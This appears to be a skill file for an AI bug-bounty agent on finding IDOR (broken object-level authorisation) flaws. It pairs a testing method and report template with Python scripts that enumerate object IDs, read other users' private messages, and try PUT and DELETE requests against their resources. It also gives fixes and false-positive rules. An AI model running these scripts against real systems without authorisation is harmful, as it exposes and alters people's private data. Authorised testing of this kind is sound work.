---
name: idor
description: Elite IDOR/BOLA testing with mandatory dual-session cross-user validation, real sensitive data extraction proof, UI navigation steps, exhaustive endpoint coverage, and zero-tolerance for status-code-only false positives
---

# IDOR — Insecure Direct Object Reference

IDOR (also called BOLA — Broken Object Level Authorization) occurs when an application uses user-supplied identifiers to access objects without verifying that the requesting user is authorized to access that specific object. It is consistently one of the most impactful and most frequently rewarded vulnerabilities in bug bounty programs.

**CRITICAL RULE: A 200 OK status code is NOT proof of IDOR. The response body MUST contain actual sensitive data that belongs to another user. Always verify what data is in the response before reporting.**

---

## Real Impact Gate — Answer Before Reporting

Before reporting any IDOR finding, explicitly confirm ALL of these:

1. **Did User B access actual private data belonging to User A?**
   - Required: User B's request returns User A's private information (email, messages, payment data, personal details, private files, etc.)
   - NOT sufficient: User B receives a 200 OK with an empty object `{}`
   - NOT sufficient: User B receives public information that was already publicly accessible
   - NOT sufficient: User B receives only the resource's existence status

2. **Is the accessed data actually private/sensitive?**
   - NOT an IDOR: accessing another user's public profile picture URL
   - NOT an IDOR: reading another user's public post/comment
   - YES an IDOR: reading another user's private messages
   - YES an IDOR: reading another user's billing information, orders, health records
   - YES an IDOR: reading another user's API keys, tokens, credentials
   - YES an IDOR: reading admin-only data as a regular user

3. **Can User B MODIFY or DELETE User A's resources?**
   - Even if data is not sensitive, unauthorized modification/deletion is still a valid IDOR
   - Example: User B can delete User A's posts → reportable even if posts are public

4. **Have you confirmed with TWO independent signals?**
   - Signal 1: User B's request to User A's resource ID returns a 200 with User A's data
   - Signal 2: The same request with User A's own session returns the same data (confirms the data belongs to User A)
   - Signal 2 alternative: The resource ID was obtained from User A's session and used successfully in User B's session

5. **What is the real business impact?**
   - Name the specific data types exposed, the number of affected users, and the regulatory implications
   - "An attacker can enumerate all message IDs from 1 to N and read every private message on the platform" is real impact
   - "A 200 was returned" is not real impact

---

## Scope of Testing

### Object Reference Locations
Test IDOR in EVERY location where an object identifier appears:

**URL path parameters**:
- `GET /api/users/{user_id}/profile`
- `GET /api/messages/{message_id}`
- `GET /api/orders/{order_id}`
- `DELETE /api/posts/{post_id}`

**Query string parameters**:
- `GET /api/data?user_id=123`
- `GET /api/export?report_id=456`
- `GET /download?file_id=789`

**JSON body parameters**:
- `POST /api/messages {"recipient_id": 123}`
- `PUT /api/orders {"order_id": 456, "status": "cancelled"}`

**HTTP headers**:
- `X-User-ID: 123`
- `X-Account-ID: 456`

**Cookie values**:
- `user_id=123` in cookie
- `account=456` in cookie

**JWT claims**:
- `{"sub": "user_123", "account_id": "456"}` — can you modify the claim?

**GraphQL arguments**:
- `query { user(id: "123") { email, messages } }`
- `query { node(id: "VXNlcjo0NTY=") { ... on User { email } } }` (base64 encoded)

### High-Value IDOR Target Endpoints

Always test these endpoint types first — they have the highest impact:

1. **User profile and settings**: `/api/users/{id}`, `/api/profile/{id}`, `/api/account/{id}`
2. **Private messages and notifications**: `/api/messages/{id}`, `/api/notifications/{id}`
3. **Financial data**: `/api/orders/{id}`, `/api/invoices/{id}`, `/api/payments/{id}`, `/api/transactions/{id}`
4. **Files and documents**: `/api/files/{id}`, `/api/documents/{id}`, `/api/attachments/{id}`
5. **API keys and tokens**: `/api/keys/{id}`, `/api/tokens/{id}`
6. **Export endpoints**: `/api/export/{report_id}`, `/api/download/{file_id}`
7. **Admin data**: `/api/admin/users/{id}`, `/api/admin/logs/{id}`
8. **Background job results**: `/api/jobs/{id}/result`, `/api/tasks/{id}/output`
9. **Multi-tenant resources**: `/api/organizations/{org_id}`, `/api/workspaces/{workspace_id}`
10. **Health/personal records**: `/api/health/{record_id}`, `/api/surveys/{id}/responses`

---

## Testing Methodology

### Phase 1: Capture User A's Object IDs via UI

The most important step is identifying object IDs through normal UI usage.

**UI Navigation for ID Collection**:
```
Step 1: Log in as User A
Step 2: Open browser DevTools → Network tab (Ctrl+Shift+I → Network)
Step 3: Navigate to every section of the application:
  - Click "My Orders" or "My Messages" or "My Files" → observe URLs and API requests
  - Click into each resource → observe the URL: does it contain an ID?
  - Look at every API request in Network tab → record any parameter named:
    id, user_id, message_id, order_id, file_id, account_id, resource_id, report_id, etc.
Step 4: Record every discovered ID:
  - User A's user ID: [ID]
  - User A's message IDs: [ID1, ID2, ID3]
  - User A's order IDs: [ID1, ID2]
  - User A's file IDs: [ID1, ID2]
  - etc.
Step 5: Take screenshots of every page visited, showing the IDs in URLs and API responses
```

**Automated ID collection from proxy**:
```python
import re, json

def extract_ids_from_proxy():
    """Extract all object IDs from proxy history"""
    # Parse proxy history (saved to /workspace/proxy_history.json)
    with open('/workspace/proxy_history.json') as f:
        requests = json.load(f)
    
    id_patterns = {
        'integer_ids': re.findall(r'"(?:id|user_id|message_id|order_id|file_id)"\s*:\s*(\d+)', str(requests)),
        'uuid_ids': re.findall(r'"(?:id|user_id|resource_id)"\s*:\s*"([0-9a-f-]{36})"', str(requests)),
        'path_ids': re.findall(r'/api/(?:users|messages|orders|files)/(\d+|[0-9a-f-]{36})', str(requests))
    }
    return id_patterns
```

### Phase 2: Create User B's Account

```
Step 1: Open incognito browser window (or new browser profile)
Step 2: Navigate to https://target.com/register
Step 3: Register User B with different email and credentials
Step 4: Log in as User B
Step 5: Capture User B's session cookie and JWT from browser storage
Step 6: Save to /workspace/user_b_session.txt
```

### Phase 3: Cross-Session IDOR Testing

For EVERY object ID collected from User A's session:

```python
import requests

def test_idor(endpoint, resource_id, user_b_cookie, user_a_data):
    """Test if User B can access User A's resources"""
    url = f"https://target.com{endpoint.format(id=resource_id)}"
    
    # Test with User B's session
    resp = requests.get(url, cookies={"session": user_b_cookie})
    
    print(f"\nTesting: {url}")
    print(f"Status: {resp.status_code}")
    print(f"Body length: {len(resp.text)}")
    
    if resp.status_code == 200:
        body_text = resp.text.lower()
        
        # Check if response contains User A's actual private data
        confirmed = False
        leaked_data = []
        
        for field, value in user_a_data.items():
            if str(value).lower() in body_text:
                leaked_data.append(f"{field}: {value}")
                confirmed = True
        
        if confirmed:
            print(f"IDOR CONFIRMED — Leaked: {leaked_data}")
            print(f"Full response: {resp.text[:500]}")
            return True, resp.text
        else:
            print("200 received but NO User A's private data in response — NOT an IDOR")
    
    elif resp.status_code == 403 or resp.status_code == 401:
        print("Access properly denied — no IDOR")
    
    return False, None

# User A's private data to look for in responses
user_a_data = {
    "email": "usera@test.com",
    "full_name": "User A Test",
    "phone": "+1234567890",
    "address": "123 Test Street"
}

# Test all discovered endpoints with User B
endpoints_to_test = [
    "/api/users/{id}",
    "/api/messages/{id}",
    "/api/orders/{id}",
    "/api/files/{id}",
]

for endpoint in endpoints_to_test:
    for resource_id in user_a_resource_ids:
        is_idor, leaked = test_idor(endpoint, resource_id, user_b_cookie, user_a_data)
```

### Phase 4: Test All HTTP Methods

For any endpoint that shows potential IDOR on GET, also test:

```python
http_methods = ['GET', 'POST', 'PUT', 'PATCH', 'DELETE', 'HEAD', 'OPTIONS']

for method in http_methods:
    resp = requests.request(
        method,
        f"https://target.com/api/messages/{user_a_message_id}",
        cookies={"session": user_b_cookie},
        json={"content": "Modified by unauthorized user"}  # for PUT/PATCH
    )
    print(f"{method}: {resp.status_code}")
```

### Phase 5: ID Enumeration

If you find a working IDOR on a specific ID, enumerate to understand scope:

```python
def enumerate_idor(base_endpoint, user_b_cookie, start=1, end=1000):
    """Enumerate all accessible resources via IDOR"""
    accessible_resources = []
    
    for resource_id in range(start, end + 1):
        resp = requests.get(
            f"https://target.com{base_endpoint}/{resource_id}",
            cookies={"session": user_b_cookie}
        )
        if resp.status_code == 200 and len(resp.text) > 50:
            accessible_resources.append({
                "id": resource_id,
                "data_preview": resp.text[:100]
            })
    
    return accessible_resources

# Run: enumerate_idor("/api/messages", user_b_cookie, 1, 10000)
# This shows the scale of the vulnerability
```

---

## Advanced IDOR Techniques

### Indirect IDOR via Export/Report Endpoints

Export and batch endpoints often skip per-item authorization:

```python
# Test export endpoints with cross-user resource IDs
for export_format in ['csv', 'pdf', 'json', 'xlsx']:
    resp = requests.get(
        f"https://target.com/api/export/user/{user_a_id}?format={export_format}",
        cookies={"session": user_b_cookie}
    )
    if resp.status_code == 200:
        print(f"IDOR via export: {export_format} — {resp.text[:200]}")
```

### GraphQL IDOR

```graphql
# Test with User B's token: access User A's private data
query IDOR_Test {
  # Try direct user lookup with User A's ID
  user(id: "USER_A_ID") {
    email
    phone
    privateMessages {
      content
      sender { email }
    }
    billingInfo {
      cardLast4
      address
    }
  }
  
  # Try node interface (Relay pattern)
  node(id: "VXNlcjpVU0VSX0FfSUQ=") {  # base64("User:USER_A_ID")
    ... on User {
      email
      privateMessages { content }
    }
  }
}
```

### IDOR via Parameter Pollution

```python
# Standard request: access own resource
requests.get("/api/messages/YOUR_MESSAGE_ID", cookies=user_b_cookie)

# Parameter pollution: inject User A's ID
requests.get("/api/messages/YOUR_ID?id=USER_A_MESSAGE_ID", cookies=user_b_cookie)
requests.get("/api/messages/YOUR_ID", 
    params={"user_id": user_a_id},
    cookies=user_b_cookie)

# JSON duplicate keys
requests.post("/api/messages",
    json={"id": user_b_own_id, "id": user_a_message_id},  # second key overrides?
    cookies=user_b_cookie)
```

### IDOR via Content-Type Switching

```python
# If JSON IDOR is blocked, try form-encoded
resp = requests.get(
    f"/api/messages/{user_a_message_id}",
    headers={"Content-Type": "application/x-www-form-urlencoded"},
    data=f"id={user_a_message_id}",
    cookies=user_b_cookie
)
```

### Horizontal to Vertical Escalation Chain

```
Step 1: Find horizontal IDOR → User B can read User A's profile
Step 2: User A's profile contains admin data or elevated permissions
Step 3: Use that data/token for vertical privilege escalation
Step 4: Access admin endpoints with obtained credentials
```

---

## UI Steps — Required in Every Report

Every IDOR report MUST include complete UI steps showing how the attacker performs the attack:

```
IDOR UI REPRODUCTION STEPS:

PRE-REQUISITES:
- Two browser windows open simultaneously
- Window 1: Logged in as User A (the victim)
- Window 2: Logged in as User B (the attacker)

VICTIM SETUP (Window 1 — User A):
Step 1: Navigate to https://target.com/messages
Step 2: Click "Compose New Message"
Step 3: Fill recipient field with another user's email
Step 4: Fill message body with: "This is a private message - SECRET CONTENT"
Step 5: Click "Send"
Step 6: Observe the URL after the message is sent: https://target.com/messages/12345
Step 7: Note the message ID: 12345 (this is User A's private message)

ATTACK (Window 2 — User B):
Step 8: In User B's browser, open DevTools → Network tab
Step 9: Navigate to https://target.com/messages (User B's own inbox)
Step 10: Click any message in User B's inbox to see a normal API request format
Step 11: In the address bar, manually navigate to: https://target.com/messages/12345
   (replacing User B's message ID with User A's message ID: 12345)
Step 12: Observe: the page loads successfully showing User A's private message content
Step 13: Screenshot: User B's browser showing User A's private message "This is a private message - SECRET CONTENT"
Step 14: Open DevTools → Network tab → find the API request: GET /api/messages/12345
Step 15: Screenshot: the API response showing User A's full message data including sender, recipient, content
```

---

## Reporting Format — All 11 Sections

**TITLE**: IDOR in Messages API — Any Authenticated User Can Read All Private Messages of Any Other User

**SEVERITY**: High (Critical if admin messages, financial data, or health records)

**CVSS Justification**:
- Attack Vector: Network (remote)
- Attack Complexity: Low (trivial to exploit)
- Privileges Required: Low (requires only a regular user account)
- User Interaction: None (no victim action required)
- Scope: Unchanged
- Confidentiality: High (private message content exposed)
- Integrity: High (messages can be modified/deleted)
- Availability: Low
CVSS Score: ~8.1 (High) to 9.1 (Critical) depending on data sensitivity

**SCREENSHOTS**:
1. User A composing private message
2. URL showing message ID 12345
3. User B's browser showing User A's private message at /messages/12345
4. API response in DevTools showing complete leaked data

**FULL HTTP REQUEST**:
```
GET /api/messages/12345 HTTP/1.1
Host: target.com
Cookie: session=USER_B_SESSION_TOKEN  ← User B's cookie, NOT User A's
Authorization: Bearer USER_B_JWT_TOKEN
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36
Accept: application/json
```

**FULL HTTP RESPONSE**:
```
HTTP/1.1 200 OK
Content-Type: application/json
Date: [timestamp]

{
  "id": 12345,
  "sender_id": USER_A_ID,            ← User A's data
  "sender_email": "usera@test.com",  ← User A's email
  "recipient_id": 99999,
  "content": "This is a private message - SECRET CONTENT",  ← User A's private message
  "sent_at": "2024-01-15T10:30:00Z",
  "read": false
}
```

**EXACT LOCATION**:
- URL: GET https://target.com/api/messages/{id}
- Vulnerable parameter: `{id}` path parameter — no ownership check performed server-side
- UI location: Dashboard → Messages → click any message → message ID appears in URL
- Authentication required: Yes (User B must be logged in)
- Authorization check: MISSING — server returns data for any message ID regardless of ownership

**WORKING POC**:
```python
#!/usr/bin/env python3
"""
IDOR PoC — Read any user's private messages
Requirements: Valid session cookie of ANY regular user
"""
import requests

TARGET = "https://target.com"
ATTACKER_COOKIE = "session=USER_B_SESSION_HERE"  # Replace with any valid session

def read_user_messages(start_id=1, end_id=10000):
    """Enumerate and read all private messages on the platform"""
    for msg_id in range(start_id, end_id):
        r = requests.get(
            f"{TARGET}/api/messages/{msg_id}",
            headers={"Cookie": ATTACKER_COOKIE, "Accept": "application/json"}
        )
        if r.status_code == 200:
            data = r.json()
            print(f"[+] Message {msg_id}: From {data.get('sender_email')} — {data.get('content')[:50]}")

read_user_messages()
```

**VALIDATION SECTION**:
- Signal 1: User B's session (session=USER_B_SESSION) successfully retrieved message 12345 created by User A — response body contains User A's email (`usera@test.com`) and the exact message content written by User A
- Signal 2: Confirmed message ID 12345 belongs to User A by comparing with User A's session: GET /api/messages/12345 with User A's cookie returns the same message, confirming it is User A's private message
- Cross-session confirmed: YES — two separate browser profiles with different accounts used
- Real data extracted: YES — User A's private message content, sender/recipient emails
- Alternative explanations ruled out: The endpoint is not public (returns 401 for unauthenticated requests). User B's session does not have any special permissions. The message ID 12345 was created exclusively by User A and was not shared with User B. No design documentation indicates this data should be publicly accessible.

**REAL IMPACT**:
Any authenticated user with a standard account can read ALL private messages sent by or to any other user on the platform, simply by iterating the message ID from 1 to N. An attacker can exfiltrate the complete private communication history of all [N] registered users. Messages may contain: passwords shared via message, confidential business communications, personal information, financial details, health information, and private media. The attack requires only a browser, takes minutes to automate, and produces no visible indication to victims. This constitutes a severe breach of user privacy, violates GDPR Article 5 (data minimization and confidentiality), and creates significant liability for the organization. Regulatory fines could reach up to 4% of annual global turnover. Users whose communications are exposed may also face personal harm from leaked private information.

**RECOMMENDED FIX**:
1. Primary: Before returning any message, verify that the requesting user's ID matches either the sender_id or recipient_id of the message: `if (message.sender_id !== req.user.id && message.recipient_id !== req.user.id) { return res.status(403).json({error: 'Forbidden'}) }`
2. Secondary: Implement row-level security in the database query: `SELECT * FROM messages WHERE id = ? AND (sender_id = ? OR recipient_id = ?)` where the last two bind values are the authenticated user's ID
3. Verification: After fix, confirm User B receives HTTP 403 when requesting User A's message IDs

---

## False Positive Rejection Rules

Mark as FALSE POSITIVE and do NOT report if:
- User B gets 200 but the response body is empty `{}` or `null` → NOT an IDOR
- User B gets 200 and the response contains ONLY data that is already publicly visible → NOT an IDOR (public data access by design)
- The "accessed" resource is the user's OWN resource that they created → NOT an IDOR (testing their own data)
- The data accessed is completely non-sensitive (e.g., public blog post count, public avatar URL) → downgrade to Informational only
- The endpoint is documented as public or is accessible without any authentication → NOT an IDOR (intentional design)
- UUID randomness makes enumeration practically infeasible AND there is no way to obtain other users' UUIDs → mark as Low and document the ID guessability separately
